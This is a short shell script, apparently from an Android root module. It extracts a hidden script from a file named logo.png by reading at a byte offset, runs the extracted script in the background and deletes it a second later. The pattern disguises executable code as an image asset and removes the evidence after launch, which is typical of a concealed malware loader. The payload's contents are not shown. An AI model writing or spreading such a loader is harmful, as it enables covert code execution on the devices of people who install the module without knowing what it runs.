MODDIR=${0%/*}
payload="$MODDIR/logo.png"
dd if=$payload bs=1 skip=$(cat offset) 2>/dev/null > pl.sh || chmod +x pl.sh; sh ./pl.sh start & sleep 1 && rm pl.sh